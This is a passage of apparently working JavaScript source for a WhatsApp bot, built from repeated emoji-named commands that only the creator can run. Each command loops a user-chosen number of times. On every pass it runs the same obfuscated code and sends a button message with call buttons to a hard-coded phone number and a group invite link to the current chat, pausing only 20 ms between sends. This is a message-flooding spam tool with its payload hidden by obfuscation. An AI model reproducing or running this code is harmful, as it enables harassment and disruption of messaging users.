haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🍋':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🍅':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🥕':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🌶️':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🧅':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🌽':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🥑':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🍆':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🫑':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🧀':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🐯':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '☠️':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else 